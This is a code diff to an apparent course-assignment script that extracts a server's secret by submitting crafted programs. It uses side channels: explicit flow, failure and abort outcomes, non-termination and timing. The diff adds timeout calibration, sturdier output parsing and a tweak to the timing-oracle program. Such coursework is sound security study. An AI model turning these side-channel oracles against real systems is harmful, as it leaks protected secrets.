@@ -99,6 +99,11 @@ TERMINATION_ORACLE_ALT_PROGRAM = """int main(int input, int secret) {
 }
 """
 
+NOOP_PROGRAM = """int main(int input, int secret) {
+  return 0;
+}
+"""
+
 
 @dataclass
 class QueryResult:
@@ -129,21 +134,21 @@ def parse_server_output(stdout: str, stderr: str) -> tuple[str, Optional[int]]:
         lines.extend(x.strip() for x in stdout.strip().splitlines() if x.strip())
     if stderr.strip():
         lines.extend(x.strip() for x in stderr.strip().splitlines() if x.strip())
-    line = lines[-1] if lines else ""
 
-    if line.startswith("success "):
-        try:
-            return "success", int(line.split()[1])
-        except Exception:
-            return "success", None
-    if line.startswith("failure "):
-        try:
-            return "failure", int(line.split()[1])
-        except Exception:
-            return "failure", None
-    if line in {"error", "abort", "insecure"}:
-        return line, None
-    if line == "":
+    for line in reversed(lines):
+        if line.startswith("success "):
+            try:
+                return "success", int(line.split()[1])
+            except Exception:
+                return "success", None
+        if line.startswith("failure "):
+            try:
+                return "failure", int(line.split()[1])
+            except Exception:
+                return "failure", None
+        if line in {"error", "abort", "insecure"}:
+            return line, None
+    if not lines:
         return "no-output", None
     return "unknown", None
 
@@ -196,6 +201,42 @@ def run_query(
             stdout="",
             stderr="",
         )
+
+
+def estimate_timeout(
+    *,
+    server_command: str,
+    userid: str,
+    base_timeout_s: float,
+    debug: bool,
+) -> float:
+    with ProgramFile(NOOP_PROGRAM) as path:
+        samples: list[float] = []
+        for input_value in (0, SECRET_MAX_EXCLUSIVE):
+            for _ in range(2):
+                res = run_query(
+                    server_command=server_command,
+                    userid=userid,
+                    program_path=path,
+                    input_value=input_value,
+                    timeout_s=max(base_timeout_s, 1.0),
+                )
+                if res.kind in {"failure", "success"}:
+                    samples.append(res.elapsed_s)
+        if not samples:
+            estimated = max(base_timeout_s, 2.0)
+            debug_log(
+                debug,
+                f"[calibration] no baseline samples; using timeout {estimated:.2f}s",
+            )
+            return estimated
+        p50 = statistics.median(samples)
+        estimated = max(base_timeout_s, min(20.0, p50 * 8.0 + 0.75))
+        debug_log(
+            debug,
+            f"[calibration] baseline median={p50:.4f}s -> timeout {estimated:.2f}s",
+        )
+        return estimated
 
 
 class ProgramFile:
@@ -351,8 +392,9 @@ def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
   while (warmup < {warmup_iters}) {{
     warmup = warmup + 1;
   }}
+  //@label H;
+  int burn = 0;
   if (secret < input) {{
-    int burn = 0;
     while (burn < {burn_iters}) {{
       burn = burn + 1;
     }}
@@ -474,13 +516,25 @@ def recover_server_secret(
     debug: bool,
 ) -> Optional[int]:
     server_command = f"~mfredrik/bin/c0_serve{server_idx}"
+    tuned_query_timeout = estimate_timeout(
+        server_command=server_command,
+        userid=userid,
+        base_timeout_s=timeout_s,
+        debug=debug,
+    )
+    tuned_timing_timeout = max(timing_timeout_s, tuned_query_timeout * 2.0)
+    debug_log(
+        debug,
+        f"[serve{server_idx}] using query-timeout={tuned_query_timeout:.2f}s "
+        f"timing-timeout={tuned_timing_timeout:.2f}s",
+    )
     strategies: list[tuple[str, Callable[[], int]]] = [
         (
             "direct explicit flow",
             lambda: recover_direct(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
             ),
         ),
         (
@@ -488,7 +542,7 @@ def recover_server_secret(
             lambda: recover_from_failure_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=IMPLICIT_BOOLEAN_PROGRAM,
             ),
         ),
@@ -497,7 +551,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=ABORT_ERROR_ORACLE_PROGRAM,
                 true_kinds={"abort"},
                 false_kinds={"failure"},
@@ -508,7 +562,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=ABORT_ASSERT_ORACLE_PROGRAM,
                 true_kinds={"abort"},
                 false_kinds={"failure"},
@@ -519,7 +573,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=ABORT_DIVZERO_ORACLE_PROGRAM,
                 true_kinds={"abort"},
                 false_kinds={"failure"},
@@ -530,7 +584,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=ABORT_MODZERO_ORACLE_PROGRAM,
                 true_kinds={"abort"},
                 false_kinds={"failure"},
@@ -541,7 +595,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=ABORT_OOB_ORACLE_PROGRAM,
                 true_kinds={"abort"},
                 false_kinds={"failure"},
@@ -552,7 +606,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=TERMINATION_ORACLE_PROGRAM,
                 true_kinds={"timeout"},
                 false_kinds={"failure"},
@@ -563,7 +617,7 @@ def recover_server_secret(
             lambda: recover_from_kind_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timeout_s,
+                timeout_s=tuned_query_timeout,
                 program_source=TERMINATION_ORACLE_ALT_PROGRAM,
                 true_kinds={"timeout"},
                 false_kinds={"failure"},
@@ -574,7 +628,7 @@ def recover_server_secret(
             lambda: recover_from_timing_oracle(
                 server_command=server_command,
                 userid=userid,
-                timeout_s=timing_timeout_s,
+                timeout_s=tuned_timing_timeout,
                 repeats=timing_repeats,
                 debug=debug,
             ),
